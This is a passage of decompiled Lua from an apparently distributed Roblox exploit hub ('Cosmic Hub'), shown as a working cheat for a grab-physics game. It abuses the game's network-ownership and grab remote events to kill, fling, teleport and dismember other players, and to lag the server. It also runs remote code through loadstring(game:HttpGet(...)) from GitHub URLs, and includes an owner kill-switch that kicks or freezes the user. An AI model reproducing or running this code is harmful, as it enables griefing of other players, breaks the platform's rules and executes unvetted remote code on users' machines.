                if l_SeatWeld_0 and l_SeatWeld_0.Part1 and l_SeatWeld_0.Part1:IsDescendantOf(game.Players.LocalPlayer.Character) then
                    return v399;
                end;
            end;
        end;
        return nil;
    end;
    local function v407()
        -- upvalues: v389 (ref), v401 (ref), v43 (ref), v47 (ref), v397 (ref)
        v389.autoGrabCoroutine = coroutine.create(function()
            -- upvalues: v401 (ref), v43 (ref), v389 (ref), v47 (ref), v397 (ref)
            local v402 = v401();
            if v402 then
                while v389.autoGrab do
                    for v403, _ in pairs(v47.TargetList) do
                        if v403 ~= game.Players.LocalPlayer.UserId then
                            local l_PlayerByUserId_1 = game.Players:GetPlayerByUserId(v403);
                            local v406 = l_PlayerByUserId_1 and l_PlayerByUserId_1.Character and l_PlayerByUserId_1.Character:FindFirstChild("HumanoidRootPart");
                            if v406 then
                                v397(v402, v406);
                            end;
                        end;
                    end;
                    task.wait(0.01);
                end;
                return;
            else
                v43:MakeNotification({
                    Name = "No Blobman Found", 
                    Content = "You must be riding a Blobman to use this.", 
                    Image = "rbxassetid://4483345998", 
                    Time = 5
                });
                return;
            end;
        end);
        coroutine.resume(v389.autoGrabCoroutine);
    end;
    v249:AddToggle({
        Name = "God Loop Target", 
        Default = false, 
        Callback = function(v408)
            -- upvalues: v389 (ref), v407 (ref)
            v389.autoGrab = v408;
            if not v408 then
                if v389.autoGrabCoroutine then
                    coroutine.close(v389.autoGrabCoroutine);
                    v389.autoGrabCoroutine = "close";
                end;
            else
                v407();
            end;
        end
    });
    local v409 = {
        enabled = false, 
        coroutine = "coroutine", 
        MAX_HOVER_DIST = 500, 
        HOVER_HEIGHT = 25
    };
    local function v416()
        -- upvalues: v409 (ref), v310 (ref), v251 (ref), v322 (ref)
        v409.coroutine = coroutine.create(function()
            -- upvalues: v409 (ref), v310 (ref), v251 (ref), v322 (ref)
            while v409.enabled do
                local v410 = v310();
                local l_selectedPlayer_0 = v251.selectedPlayer;
                if v410 and l_selectedPlayer_0 and l_selectedPlayer_0.Character and l_selectedPlayer_0.Character:FindFirstChild("HumanoidRootPart") then
                    local l_HumanoidRootPart_11 = l_selectedPlayer_0.Character.HumanoidRootPart;
                    local l_Character_15 = v251.LocalPlayer.Character;
                    local v414 = l_Character_15 and l_Character_15:FindFirstChild("HumanoidRootPart");
                    if v414 and (v414.Position - l_HumanoidRootPart_11.Position).Magnitude <= v409.MAX_HOVER_DIST then
                        local v415 = l_HumanoidRootPart_11.Position + Vector3.new(0, v409.HOVER_HEIGHT, 0);
                        v322(v410, v415);
                    end;
                end;
                task.wait(0.06);
            end;
        end);
        coroutine.resume(v409.coroutine);
    end;
    v249:AddToggle({
        Name = "Hover above target", 
        Default = false, 
        Callback = function(v417)
            -- upvalues: v409 (ref), v416 (ref)
            v409.enabled = v417;
            if not v417 then
                if v409.coroutine then
                    coroutine.close(v409.coroutine);
                    v409.coroutine = "close";
                end;
            else
                v416();
            end;
        end
    });
    local v418 = v44:MakeTab({
        Name = "Auras", 
        Icon = "rbxassetid://6031075939", 
        PremiumOnly = false
    });
    local _ = v418:AddSection({
        Name = "Auras"
    });
    local v420 = {
        auraCoroutine = "auraCoroutine", 
        gravityCoroutine = "gravityCoroutine", 
        localPlayer = game.Players.LocalPlayer, 
        Players = game.Players, 
        Debris = game:GetService("Debris"), 
        SetNetworkOwner = game.ReplicatedStorage:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner"), 
        OrionLib = v43, 
        Tab = v418, 
        auraRadius = 25
    };
    local function v433()
        -- upvalues: v420 (ref)
        v420.auraCoroutine = coroutine.create(function()
            -- upvalues: v420 (ref)
            while true do
                local l_status_0, l_result_0 = pcall(function()
                    -- upvalues: v420 (ref)
                    local l_Character_16 = v420.localPlayer.Character;
                    if l_Character_16 and l_Character_16:FindFirstChild("Head") and l_Character_16:FindFirstChild("HumanoidRootPart") then
                        local _ = l_Character_16.Head;
                        local l_HumanoidRootPart_12 = l_Character_16.HumanoidRootPart;
                        do
                            local l_l_HumanoidRootPart_12_0 = l_HumanoidRootPart_12;
                            for _, v426 in pairs(v420.Players:GetPlayers()) do
                                do
                                    local l_v426_0 = v426;
                                    coroutine.wrap(function()
                                        -- upvalues: l_v426_0 (ref), v420 (ref), l_l_HumanoidRootPart_12_0 (ref)
                                        if l_v426_0 ~= v420.localPlayer and l_v426_0.Character then
                                            local l_Character_17 = l_v426_0.Character;
                                            local l_Torso_0 = l_Character_17:FindFirstChild("Torso");
                                            if l_Torso_0 and (l_Torso_0.Position - l_l_HumanoidRootPart_12_0.Position).Magnitude <= v420.auraRadius then
                                                v420.SetNetworkOwner:FireServer(l_Torso_0, l_Character_17.HumanoidRootPart.FirePlayerPart.CFrame);
                                                task.wait(0.1);
                                                local v430 = l_Torso_0:FindFirstChild("l") or Instance.new("BodyVelocity", l_Torso_0);
                                                v430.Name = "l";
                                                v430.Velocity = Vector3.new(0, 200000000000, 0);
                                                v430.MaxForce = Vector3.new(0, math.huge, 0);
                                                v420.Debris:AddItem(v430, 100);
                                                task.wait(1);
                                                v420.SetNetworkOwner:FireServer(l_Torso_0, nil);
                                                if v430 then
                                                    v430:Destroy();
                                                end;
                                            end;
                                        end;
                                    end)();
                                end;
                            end;
                        end;
                    end;
                end);
                if not l_status_0 then
                    warn("Error in Air Suspend Aura: " .. tostring(l_result_0));
                end;
                task.wait(0.02);
            end;
        end);
        coroutine.resume(v420.auraCoroutine);
    end;
    local function v434()
        -- upvalues: v420 (ref)
        if v420.auraCoroutine then
            coroutine.close(v420.auraCoroutine);
            v420.auraCoroutine = "close";
        end;
    end;
    v420.Tab:AddToggle({
        Name = " Launch Aura", 
        Default = false, 
        Callback = function(v435)
            -- upvalues: v433 (ref), v434 (ref)
            if v435 then
                v433();
            else
                v434();
            end;
        end
    });
    v420.localPlayer.CharacterAdded:Connect(function(v436)
        -- upvalues: v420 (ref)
        v420.playerCharacter = v436;
    end);
    local function v453()
        -- upvalues: v420 (ref), l_Workspace_0 (ref)
        v420.gravityCoroutine = coroutine.create(function()
            -- upvalues: v420 (ref), l_Workspace_0 (ref)
            while true do
                local l_status_1, l_result_1 = pcall(function()
                    -- upvalues: v420 (ref), l_Workspace_0 (ref)
                    local l_Character_18 = v420.localPlayer.Character;
                    if l_Character_18 and l_Character_18:FindFirstChild("HumanoidRootPart") then
                        local l_HumanoidRootPart_13 = l_Character_18.HumanoidRootPart;
                        local l_CurrentCamera_0 = l_Workspace_0.CurrentCamera;
                        for _, v441 in pairs(v420.Players:GetPlayers()) do
                            if v441 ~= v420.localPlayer and v441.Character then
                                local l_Character_19 = v441.Character;
                                local l_Torso_1 = l_Character_19:FindFirstChild("Torso");
                                if l_Torso_1 and (l_Torso_1.Position - l_HumanoidRootPart_13.Position).Magnitude <= v420.auraRadius then
                                    v420.SetNetworkOwner:FireServer(l_Torso_1, l_HumanoidRootPart_13.CFrame);
                                    for _, v445 in ipairs(l_Character_19:GetDescendants()) do
                                        if v445:IsA("BasePart") then
                                            v445.CanCollide = false;
                                        end;
                                    end;
                                    local v446 = l_Torso_1:FindFirstChild("HellAuraPos") or Instance.new("BodyPosition");
                                    v446.Name = "HellAuraPos";
                                    v446.MaxForce = Vector3.new(100000, 100000, 100000);
                                    v446.D = 500;
                                    v446.P = 50000;
                                    v446.Parent = l_Torso_1;
                                    local v447 = l_Torso_1:FindFirstChild("HellAuraGyro") or Instance.new("BodyGyro");
                                    v447.Name = "HellAuraGyro";
                                    v447.MaxTorque = Vector3.new(100000, 100000, 100000);
                                    v447.D = 500;
                                    v447.P = 50000;
                                    v447.Parent = l_Torso_1;
                                    local l_LookVector_0 = l_CurrentCamera_0.CFrame.LookVector;
                                    local v449 = 15;
                                    local v450 = Vector3.new(0, 5, 0);
                                    v446.Position = l_HumanoidRootPart_13.Position + l_LookVector_0 * v449 + v450;
                                    v447.CFrame = CFrame.new(l_Torso_1.Position, l_HumanoidRootPart_13.Position);
                                end;
                            end;
                        end;
                    end;
                end);
                if not l_status_1 then
                    warn("Error in Hell Send Aura: " .. tostring(l_result_1));
                end;
                task.wait(0.05);
            end;
        end);
        coroutine.resume(v420.gravityCoroutine);
    end;
    local function v454()
        -- upvalues: v420 (ref)
        if v420.gravityCoroutine then
            coroutine.close(v420.gravityCoroutine);
            v420.gravityCoroutine = "close";
        end;
    end;
    v420.Tab:AddToggle({
        Name = "Telekinesis Aura", 
        Default = false, 
        Callback = function(v455)
            -- upvalues: v453 (ref), v454 (ref)
            if not v455 then
                v454();
            else
                v453();
            end;
        end
    });
    function death(v456)
        -- upvalues: v47 (ref), l_RunService_0 (ref), l_Players_0 (ref), l_LocalPlayer_0 (ref), l_GrabEvents_0 (ref)
        if deathConnection then
            deathConnection:Disconnect();
        end;
        if not v456 then
            v47.Death_Aura = false;
            return;
        else
            v47.Death_Aura = true;
            deathConnection = l_RunService_0.Heartbeat:Connect(function()
                -- upvalues: l_Players_0 (ref), l_LocalPlayer_0 (ref), l_GrabEvents_0 (ref)
                for _, v458 in ipairs(l_Players_0:GetPlayers()) do
                    if v458 ~= l_LocalPlayer_0 and v458.Character then
                        local l_HumanoidRootPart_14 = v458.Character:FindFirstChild("HumanoidRootPart");
                        local l_Head_1 = v458.Character:FindFirstChild("Head");
                        local l_Humanoid_8 = v458.Character:FindFirstChildOfClass("Humanoid");
                        do
                            local l_l_HumanoidRootPart_14_0, l_l_Head_1_0, l_l_Humanoid_8_0 = l_HumanoidRootPart_14, l_Head_1, l_Humanoid_8;
                            if l_l_HumanoidRootPart_14_0 and l_l_Head_1_0 and l_l_Humanoid_8_0 and l_l_Humanoid_8_0.Health > 0 and (l_l_HumanoidRootPart_14_0.Position - l_LocalPlayer_0.Character.HumanoidRootPart.Position).Magnitude <= 25 then
                                pcall(function()
                                    -- upvalues: l_GrabEvents_0 (ref), l_l_HumanoidRootPart_14_0 (ref), l_l_Head_1_0 (ref), l_LocalPlayer_0 (ref), l_l_Humanoid_8_0 (ref)
                                    l_GrabEvents_0.SetNetworkOwner:FireServer(l_l_HumanoidRootPart_14_0, l_l_HumanoidRootPart_14_0.CFrame);
                                    task.wait(0.1);
                                    l_GrabEvents_0.DestroyGrabLine:FireServer(l_l_HumanoidRootPart_14_0);
                                    if l_l_Head_1_0:FindFirstChild("PartOwner") and l_l_Head_1_0.PartOwner.Value == l_LocalPlayer_0.Name then
                                        for _, v466 in pairs(l_l_Humanoid_8_0.Parent:GetChildren()) do
                                            if v466:IsA("BasePart") then
                                                v466.CFrame = CFrame.new(-1000000000, 1000000000, -1000000000);
                                            end;
                                        end;
                                        task.wait();
                                        for _, v468 in pairs(l_l_Humanoid_8_0.Parent:GetChildren()) do
                                            if v468:IsA("BasePart") then
                                                v468.CFrame = CFrame.new(-1000000000, 1000000000, -1000000000);
                                            end;
                                        end;
                                        local l_BodyVelocity_1 = Instance.new("BodyVelocity");
                                        l_BodyVelocity_1.Velocity = Vector3.new(0, -9999999, 0);
                                        l_BodyVelocity_1.MaxForce = Vector3.new(9000000000, 9000000000, 9000000000);
                                        l_BodyVelocity_1.P = 100000075;
                                        l_BodyVelocity_1.Parent = l_l_HumanoidRootPart_14_0;
                                        l_l_Humanoid_8_0.Sit = false;
                                        l_l_Humanoid_8_0.Jump = true;
                                        l_l_Humanoid_8_0.BreakJointsOnDeath = false;
                                        l_l_Humanoid_8_0:ChangeState(Enum.HumanoidStateType.Dead);
                                        do
                                            local l_l_BodyVelocity_1_0 = l_BodyVelocity_1;
                                            task.delay(2, function()
                                                -- upvalues: l_l_BodyVelocity_1_0 (ref)
                                                if l_l_BodyVelocity_1_0 and l_l_BodyVelocity_1_0.Parent then
                                                    l_l_BodyVelocity_1_0:Destroy();
                                                end;
                                            end);
                                        end;
                                    end;
                                end);
                            end;
                        end;
                    end;
                end;
            end);
            return;
        end;
    end;
    v418:AddToggle({
        Name = "Death Aura", 
        Default = false, 
        Callback = death
    });
    local v471 = v44:MakeTab({
        Name = "Teleport", 
        Icon = "rbxassetid://6031068433", 
        PremiumOnly = false
    });
    local _ = v471:AddSection({
        Name = "Teleport"
    });
    local v473 = false;
    local v474 = nil;
    local function v478()
        -- upvalues: l_Players_0 (ref), l_LocalPlayer_0 (ref)
        local v475 = {};
        for _, v477 in pairs(l_Players_0:GetPlayers()) do
            if v477 ~= l_LocalPlayer_0 then
                table.insert(v475, v477.Name);
            end;
        end;
        return v475;
    end;
    local function v480(v479)
        -- upvalues: v478 (ref)
        v479:Refresh(v478(), true);
    end;
    local v482 = v471:AddDropdown({
        Name = "Select Player", 
        Default = "rbxassetid://6031068433", 
        Options = v478(), 
        Callback = function(v481)
            -- upvalues: v27 (ref)
            v27 = v481;
        end
    });
    v480(v482);
    local function v485()
        -- upvalues: v27 (ref), l_Players_0 (ref), l_LocalPlayer_0 (ref), v43 (ref)
        if not v27 then
            v43:MakeNotification({
                Name = "Error", 
                Content = "No player selected.", 
                Time = 3
            });
        else
            local l_l_Players_0_FirstChild_0 = l_Players_0:FindFirstChild(v27);
            if not l_l_Players_0_FirstChild_0 or not l_l_Players_0_FirstChild_0.Character or not l_l_Players_0_FirstChild_0.Character:FindFirstChild("HumanoidRootPart") then
                v43:MakeNotification({
                    Name = "Error", 
                    Content = "Target player not found.", 
                    Time = 3
                });
            else
                local l_Position_3 = l_l_Players_0_FirstChild_0.Character.HumanoidRootPart.Position;
                if not l_LocalPlayer_0.Character or not l_LocalPlayer_0.Character:FindFirstChild("HumanoidRootPart") then
                    v43:MakeNotification({
                        Name = "Error", 
                        Content = "Character was not found.", 
                        Time = 3
                    });
                else
                    l_LocalPlayer_0.Character.HumanoidRootPart.CFrame = CFrame.new(l_Position_3);
                end;
            end;
        end;
    end;
    v471:AddButton({
        Name = "Teleport to Player", 
        Callback = function()
            -- upvalues: v485 (ref)
            v485();
        end
    });
    local function v486()
        -- upvalues: v474 (ref), v473 (ref), v485 (ref)
        v474 = coroutine.create(function()
            -- upvalues: v473 (ref), v485 (ref)
            while v473 do
                v485();
                wait(0.02);
            end;
        end);
        coroutine.resume(v474);
    end;
    v471:AddToggle({
        Name = "Loop Teleport", 
        Default = false, 
        Callback = function(v487)
            -- upvalues: v473 (ref), v486 (ref), v474 (ref)
            v473 = v487;
            if not v487 then
                v474 = nil;
            else
                v486();
            end;
        end
    });
    l_Players_0.PlayerAdded:Connect(function()
        -- upvalues: v480 (ref), v482 (ref)
        v480(v482);
    end);
    l_Players_0.PlayerRemoving:Connect(function()
        -- upvalues: v480 (ref), v482 (ref)
        v480(v482);
    end);
    local v488 = v44:MakeTab({
        Name = "Random", 
        Icon = "rbxassetid://4483345998", 
        PremiumOnly = false
    });
    local _ = v488:AddSection({
        Name = "Working"
    });
    local v490 = false;
    local v491 = 5;
    local function v495()
        -- upvalues: v490 (ref), v491 (ref), l_Players_0 (ref), l_ReplicatedStorage_0 (ref)
        while v490 do
            for _ = 1, v491 do
                for _, v494 in ipairs(l_Players_0:GetPlayers()) do
                    if v494.Character and v494.Character:FindFirstChild("Torso") then
                        l_ReplicatedStorage_0.GrabEvents.CreateGrabLine:FireServer(v494.Character.Torso, v494.Character.Torso.CFrame);
                    end;
                end;
            end;
            wait(1);
        end;
    end;
    v488:AddToggle({
        Name = "Lag", 
        Default = false, 
        Callback = function(v496)
            -- upvalues: v490 (ref), v495 (ref)
            v490 = v496;
            if v490 then
                task.spawn(v495);
            end;
        end
    });
    v488:AddSlider({
        Name = "Lag Intensity", 
        Min = 1, 
        Max = 1000, 
        Default = 5, 
        Callback = function(v497)
            -- upvalues: v491 (ref)
            v491 = v497;
        end
    });
    local v498 = {
        P = game:GetService("Players"), 
        RS = game:GetService("RunService"), 
        W = l_Workspace_0, 
        A = false, 
        Q = {}, 
        Pos = "Pos", 
        Cam = "Cam", 
        R = 15, 
        Conn = "Conn", 
        WL = false, 
        CB = Instance.new("Part")
    };
    v498.CB.Anchored = true;
    v498.CB.CanCollide = false;
    v498.CB.Transparency = 1;
    v498.CB.CanQuery = false;
    v498.CB.Size = Vector3.new(10, 10, 10);
    local function v500()
        -- upvalues: v498 (ref)
        local l_CurrentCamera_1 = v498.W.CurrentCamera;
        v498.CB.CFrame = v498.Cam;
        v498.CB.Parent = v498.W;
        l_CurrentCamera_1.CameraType = Enum.CameraType.Scriptable;
        l_CurrentCamera_1.CFrame = v498.Cam;
    end;
    local function v502()
        -- upvalues: v498 (ref)
        v498.CB.Parent = "Parent";
        local l_CurrentCamera_2 = v498.W.CurrentCamera;
        l_CurrentCamera_2.CameraType = Enum.CameraType.Custom;
        if v498.Cam then
            l_CurrentCamera_2.CFrame = v498.Cam;
        end;
        v498.Cam = "CFrame";
    end;
    local function v506(v503)
        for _, v505 in pairs(v503:GetDescendants()) do
            if v505:IsA("BasePart") then
                v505.CanCollide = false;
            end;
        end;
    end;
    local function v510(v507)
        -- upvalues: v498 (ref)
        local l_PlotItems_0 = v498.W:FindFirstChild("PlotItems");
        local v509 = l_PlotItems_0 and l_PlotItems_0:FindFirstChild("PlayersInPlots");
        return v509 and v509:FindFirstChild(v507.Name);
    end;
    local function v513(v511)
        -- upvalues: v498 (ref)
        if (v511.Position - v498.Pos).Magnitude > v498.R then
            local _ = false;
        end;
        return true;
    end;
    local function v515(v514)
        -- upvalues: v498 (ref)
        if v514 ~= v498.P.LocalPlayer then
            if v498.WL and v498.P.LocalPlayer:IsFriendsWith(v514.UserId) then
                return true;
            else
                return false;
            end;
        else
            return true;
        end;
    end;
    local function v519()
        -- upvalues: v498 (ref), v515 (ref), v510 (ref), v513 (ref)
        v498.Q = {};
        for _, v517 in pairs(v498.P:GetPlayers()) do
            if not v515(v517) and v517.Character and not v510(v517) then
                local l_HumanoidRootPart_15 = v517.Character:FindFirstChild("HumanoidRootPart");
                if l_HumanoidRootPart_15 and not v513(l_HumanoidRootPart_15) then
                    table.insert(v498.Q, v517);
                end;
            end;
        end;
    end;
    local function v525()
        -- upvalues: v498 (ref), v519 (ref), v506 (ref), l_SetNetworkOwner_0 (ref)
        if #v498.Q == 0 then
            v519();
            if #v498.Q == 0 then
                return;
            end;
        end;
        local v520 = v498.Q[1];
        table.remove(v498.Q, 1);
        if v520 and v520.Character then
            local l_HumanoidRootPart_16 = v520.Character:FindFirstChild("HumanoidRootPart");
            local l_Head_2 = v520.Character:FindFirstChild("Head");
            local v523 = v498.P.LocalPlayer.Character and v498.P.LocalPlayer.Character:FindFirstChild("HumanoidRootPart");
            if l_HumanoidRootPart_16 and l_Head_2 and v523 then
                v498.P.LocalPlayer.Character:PivotTo(l_HumanoidRootPart_16.CFrame * CFrame.new(0, -6, 0));
                v506(v498.P.LocalPlayer.Character);
                local v524 = 0;
                repeat
                    l_SetNetworkOwner_0:FireServer(l_HumanoidRootPart_16, v523.CFrame);
                    task.wait(0.15);
                    v524 = v524 + 1;
                until v524 > 20 or l_Head_2:FindFirstChild("PartOwner") and l_Head_2.PartOwner.Value == v498.P.LocalPlayer.Name or not v498.A;
                if v498.A and l_Head_2:FindFirstChild("PartOwner") and l_Head_2.PartOwner.Value == v498.P.LocalPlayer.Name then
                    l_HumanoidRootPart_16.CFrame = CFrame.new(v498.Pos);
                    l_HumanoidRootPart_16.Position = v498.Pos;
                    l_HumanoidRootPart_16.AssemblyLinearVelocity = Vector3.zero;
                    task.wait(0.8);
                end;
            end;
            return;
        else
            return;
        end;
    end;
    local function v528()
        -- upvalues: v498 (ref), v519 (ref), v500 (ref), v525 (ref)
        local v526 = v498.P.LocalPlayer.Character and v498.P.LocalPlayer.Character:FindFirstChild("HumanoidRootPart");
        if not v526 then
            return;
        else
            v498.Pos = v526.Position;
            v498.Cam = v498.W.CurrentCamera.CFrame;
            v519();
            v500();
            v498.Conn = v498.RS.Heartbeat:Connect(function()
                -- upvalues: v498 (ref), v525 (ref)
                if v498.A then
                    v525();
                    if v498.Cam then
                        local l_CurrentCamera_3 = v498.W.CurrentCamera;
                        l_CurrentCamera_3.CameraType = Enum.CameraType.Scriptable;
                        l_CurrentCamera_3.CFrame = v498.Cam;
                        v498.CB.CFrame = v498.Cam;
                        v498.CB.Parent = v498.W;
                    end;
                end;
            end);
            return;
        end;
    end;
    local function v530()
        -- upvalues: v498 (ref), v502 (ref)
        if v498.Conn then
            v498.Conn:Disconnect();
            v498.Conn = "Disconnect";
        end;
        v502();
        local v529 = v498.P.LocalPlayer.Character and v498.P.LocalPlayer.Character:FindFirstChild("HumanoidRootPart");
        if v529 and v498.Pos then
            v529.AssemblyLinearVelocity = Vector3.zero;
            v529.CFrame = CFrame.new(v498.Pos);
        end;
    end;
    local function v534(v531)
        -- upvalues: v498 (ref), v502 (ref), v500 (ref), v525 (ref)
        v531:WaitForChild("Humanoid").Died:Connect(function()
            -- upvalues: v498 (ref), v502 (ref)
            if v498.Conn then
                v498.Conn:Disconnect();
                v498.Conn = "Disconnect";
            end;
            v502();
        end);
        if v498.A then
            local l_HumanoidRootPart_17 = v531:WaitForChild("HumanoidRootPart");
            v498.Pos = v498.Pos or l_HumanoidRootPart_17.Position;
            v498.Cam = v498.Cam or v498.W.CurrentCamera.CFrame;
            v500();
            v498.Conn = v498.RS.Heartbeat:Connect(function()
                -- upvalues: v498 (ref), v525 (ref)
                if v498.A then
                    v525();
                    if v498.Cam then
                        local l_CurrentCamera_4 = v498.W.CurrentCamera;
                        l_CurrentCamera_4.CameraType = Enum.CameraType.Scriptable;
                        l_CurrentCamera_4.CFrame = v498.Cam;
                        v498.CB.CFrame = v498.Cam;
                        v498.CB.Parent = v498.W;
                    end;
                end;
            end);
        end;
    end;
    v498.P.LocalPlayer.CharacterAdded:Connect(v534);
    v498.P.PlayerAdded:Connect(function()
        -- upvalues: v498 (ref), v519 (ref)
        if v498.A then
            v519();
        end;
    end);
    v498.P.PlayerRemoving:Connect(function(v535)
        -- upvalues: v498 (ref)
        for v536 = #v498.Q, 1, -1 do
            if v498.Q[v536] == v535 then
                table.remove(v498.Q, v536);
            end;
        end;
    end);
    v488:AddToggle({
        Name = "Bring All", 
        Default = false, 
        Callback = function(v537)
            -- upvalues: v498 (ref), v528 (ref), v530 (ref)
            v498.A = v537;
            if v537 then
                v528();
            else
                v530();
            end;
        end
    });
    v488:AddToggle({
        Name = "Whitelist Friends", 
        Default = false, 
        Callback = function(v538)
            -- upvalues: v498 (ref)
            v498.WL = v538;
        end
    });
    local v539 = {
        ws = game:GetService("Workspace"), 
        plrs = game:GetService("Players"), 
        debris = game:GetService("Debris"), 
        uis = game:GetService("UserInputService"), 
        fpdHeight = l_Workspace_0.FallenPartsDestroyHeight, 
        parts = {
            "Left Leg", 
            "Right Leg", 
            "Left Arm", 
            "Right Arm", 
            "HumanoidRootPart"
        }
    };
    local function v546()
        -- upvalues: v539 (ref)
        local l_GrabParts_0 = v539.ws:FindFirstChild("GrabParts");
        if l_GrabParts_0 then
            for _, v542 in ipairs(l_GrabParts_0:GetChildren()) do
                if v542:IsA("BasePart") then
                    for _, v544 in ipairs(v542:GetChildren()) do
                        if v544:IsA("WeldConstraint") and v544.Part1 and v544.Part1.Parent:IsA("Model") then
                            local l_Parent_0 = v544.Part1.Parent;
                            if l_Parent_0:FindFirstChildOfClass("Humanoid") then
                                return v539.plrs:GetPlayerFromCharacter(l_Parent_0);
                            end;
                        end;
                    end;
                end;
            end;
            return nil;
        else
            return nil;
        end;
    end;
    local function v562(v547)
        -- upvalues: v539 (ref)
        if not v547 then
            return;
        else
            local l_Character_20 = v547.Character;
            if not l_Character_20 then
                return;
            else
                local v549 = {};
                for _, v551 in ipairs(v539.parts) do
                    local l_l_Character_20_FirstChild_0 = l_Character_20:FindFirstChild(v551);
                    do
                        local l_l_l_Character_20_FirstChild_0_0 = l_l_Character_20_FirstChild_0;
                        if l_l_l_Character_20_FirstChild_0_0 then
                            for _, v555 in ipairs(v539.ws:GetDescendants()) do
                                if v555:IsA("WeldConstraint") and (v555.Part0 == l_l_l_Character_20_FirstChild_0_0 or v555.Part1 == l_l_l_Character_20_FirstChild_0_0) then
                                    v555.Enabled = false;
                                    table.insert(v549, v555);
                                end;
                            end;
                            for _, v557 in ipairs(l_l_l_Character_20_FirstChild_0_0:GetChildren()) do
                                if v557:IsA("Motor6D") or v557:IsA("Weld") then
                                    v557.Enabled = false;
                                    table.insert(v549, v557);
                                end;
                            end;
                            l_l_l_Character_20_FirstChild_0_0.Anchored = false;
                            local v558 = Vector3.new(l_l_l_Character_20_FirstChild_0_0.Position.X, v539.fpdHeight - 100, l_l_l_Character_20_FirstChild_0_0.Position.Z);
                            do
                                local l_v558_0 = v558;
                                pcall(function()
                                    -- upvalues: l_l_l_Character_20_FirstChild_0_0 (ref), l_v558_0 (ref)
                                    if not l_l_l_Character_20_FirstChild_0_0:IsA("Model") then
                                        l_l_l_Character_20_FirstChild_0_0.CFrame = CFrame.new(l_v558_0);
                                    else
                                        l_l_l_Character_20_FirstChild_0_0.PrimaryPart = l_l_l_Character_20_FirstChild_0_0.PrimaryPart or l_l_l_Character_20_FirstChild_0_0:FindFirstChildWhichIsA("BasePart");
                                        if l_l_l_Character_20_FirstChild_0_0.PrimaryPart then
                                            l_l_l_Character_20_FirstChild_0_0:SetPrimaryPartCFrame(CFrame.new(l_v558_0));
                                        end;
                                    end;
                                end);
                                task.wait(0.1);
                            end;
                        end;
                    end;
                end;
                for _, v561 in ipairs(v549) do
                    v561.Enabled = true;
                end;
                return;
            end;
        end;
    end;
    local function v564()
        -- upvalues: v546 (ref), v562 (ref)
        local v563 = v546();
        if v563 then
            v562(v563);
        end;
    end;
    if v539.uis.TouchEnabled then
        v488:AddButton({
            Name = "Delete Limbs (Hold and ragdoll player)", 
            Callback = v564
        });
    end;
    local v565 = v44:MakeTab({
        Name = "Credits", 
        Icon = "rbxassetid://6035047375", 
        PremiumOnly = false
    });
    v565:AddLabel("CREATOR: Cosmic_TCU (TCUTCU_LLBDDLLZYXZY)");
    v565:AddLabel("GO FOLLOW: Crisila_TCU (Superduperalt0987)");
    v565:AddLabel("HELPERS: jeke/brilliant, moonydev");
    v565:AddButton({
        Name = "Cosmic Hub Discord Server", 
        Callback = function()
            -- upvalues: v43 (ref)
            setclipboard("https://discord.gg/mzkKQhyNqv");
            v43:MakeNotification({
                Name = "Copied!", 
                Content = "Discord link has been copied to your clipboard.", 
                Image = "rbxassetid://4483345998", 
                Time = 3
            });
        end
    });
    local v566 = v44:MakeTab({
        Name = "Extra", 
        Icon = "rbxassetid://6031094675", 
        PremiumOnly = false
    });
    v566:AddButton({
        Name = "Cosmic Hub Auras", 
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Jeffepicy/CosmicAuras/refs/heads/main/SigmaAuras", true))();
        end
    });
    v566:AddButton({
        Name = "Dex", 
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/m0onyy/Test/refs/heads/main/mobile%20dex.lua", true))();
        end
    });
    v566:AddButton({
        Name = "Infinite Yield", 
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/ttwizz/infiniteyield/master/source.lua", true))();
        end
    });
    v566:AddLabel("Current version: V2.049");
    local v567 = "https://raw.githubusercontent.com/Jeffepicy/unsafety/main/hihiihih";
    (function()
        -- upvalues: v567 (ref), l_HttpService_0 (ref), l_LocalPlayer_0 (ref)
        local l_status_2, l_result_2 = pcall(function()
            -- upvalues: v567 (ref)
            return game:HttpGet(v567);
        end);
        if l_status_2 and l_result_2 then
            local v570 = nil;
            do
                local l_v570_0 = v570;
                pcall(function()
                    -- upvalues: l_v570_0 (ref), l_HttpService_0 (ref), l_result_2 (ref)
                    l_v570_0 = l_HttpService_0:JSONDecode(l_result_2);
                end);
                if l_v570_0 == true then
                    l_LocalPlayer_0:Kick("Script disabled by Owner.");
                    task.wait(1);
                    while true do

                    end;
                end;
            end;
        else
            warn("Failed to check shutdown status.");
        end;
    end)();
    local v572 = {};
    local v573 = "https://raw.githubusercontent.com/Jeffepicy/whitelist/main/whitelist.txt";
    local l_status_3, l_result_3 = pcall(function()
        -- upvalues: v573 (ref)
        return game:HttpGet(v573);
    end);
    if not l_status_3 or not l_result_3 then
        local v576 = "Kick";
        local l_l_LocalPlayer_0_0 = l_LocalPlayer_0;
        l_LocalPlayer_0[v576](l_l_LocalPlayer_0_0, "Whitelist services down. Try again later.");
        return;
    else
        local v578 = "JSONDecode";
        local l_l_HttpService_0_0 = l_HttpService_0;
        local v580 = l_HttpService_0[v578](l_l_HttpService_0_0, l_result_3);
        if typeof(v580) == "table" then
            for _, v582 in ipairs(v580) do
                table.insert(v572, v582);
            end;
        end;
        v580 = {};
        l_l_HttpService_0_0 = {};
        v578 = {};
        local v583 = {};
        local v584 = v572 or {};
        local function v587(v585)
            -- upvalues: v584 (ref)
            if table.find(v584, v585.UserId) == "UserId" then
                local _ = false;
            end;
            return true;
        end;
        local function v592(v588)
            -- upvalues: l_TextChatService_0 (ref), l_ReplicatedStorage_0 (ref)
            if l_TextChatService_0.ChatVersion == Enum.ChatVersion.TextChatService then
                local l_TextChannels_0 = l_TextChatService_0:FindFirstChild("TextChannels");
                if l_TextChannels_0 then
                    local l_RBXGeneral_0 = l_TextChannels_0:FindFirstChild("RBXGeneral");
                    if l_RBXGeneral_0 then
                        l_RBXGeneral_0:SendAsync(v588);
                    end;
                end;
            else
                local l_DefaultChatSystemChatEvents_0 = l_ReplicatedStorage_0:FindFirstChild("DefaultChatSystemChatEvents");
                if l_DefaultChatSystemChatEvents_0 and l_DefaultChatSystemChatEvents_0:FindFirstChild("SayMessageRequest") then
                    l_DefaultChatSystemChatEvents_0.SayMessageRequest:FireServer(v588, "All");
                end;
            end;
        end;
        local function v596(v593)
            -- upvalues: v578 (ref), l_LocalPlayer_0 (ref)
            v578[v593] = not v578[v593];
